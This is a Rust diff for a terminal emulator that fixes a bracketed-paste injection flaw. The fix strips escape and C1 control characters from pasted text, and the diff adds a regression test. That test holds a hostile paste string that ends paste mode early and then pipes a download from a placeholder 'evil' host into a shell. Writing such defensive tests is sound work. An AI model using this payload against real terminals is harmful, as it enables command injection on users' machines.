@@ -696,9 +696,14 @@ pub fn terminal_commit_text_bytes(text: String, bracketed_paste_mode: bool) -> V
     let normalized = text.replace("\r\n", "\r").replace('\n', "\r");
     let code_point_count = normalized.chars().count();
     if code_point_count > 1 && bracketed_paste_mode {
+        // RC-12(2026-09-29 コードレビュー): 本文に`ESC[201~`が含まれていると
+        // bracketed pasteがそこで終わり、残りがシェルにコマンドとして実行されて
+        // しまう(クリップボード経由のコマンド注入)。xterm/kitty等と同様、括る前に
+        // ESCとC1制御文字(8bit CSI等)を取り除く。
+        let sanitized: String = normalized.chars().filter(|&c| c != '\x1b' && !('\u{80}'..='\u{9f}').contains(&c)).collect();
         let mut bytes = Vec::new();
         bytes.extend_from_slice(b"\x1B[200~");
-        bytes.extend_from_slice(normalized.as_bytes());
+        bytes.extend_from_slice(sanitized.as_bytes());
         bytes.extend_from_slice(b"\x1B[201~");
         bytes
     } else {
@@ -2393,6 +2398,17 @@ mod terminal_key_mapping_tests {
     #[test]
     fn crlf_is_normalized_to_single_cr() {
         assert_eq!(terminal_commit_text_bytes("a\r\nb".to_string(), false), "a\rb".as_bytes().to_vec());
+    }
+
+    #[test]
+    fn bracketed_paste_strips_embedded_end_marker_and_escapes() {
+        // RC-12: 本文中の`ESC[201~`でbracketed pasteを抜けてコマンドを注入できないこと。
+        let bytes = terminal_commit_text_bytes("x\x1b[201~curl evil|sh\r".to_string(), true);
+        assert!(bytes.starts_with(b"\x1b[200~"));
+        assert!(bytes.ends_with(b"\x1b[201~"));
+        let inner = &bytes[6..bytes.len() - 6];
+        assert!(!inner.contains(&0x1b), "本文にESCが残ってはいけない");
+        assert_eq!(inner, b"x[201~curl evil|sh\r");
     }
 
     #[test]
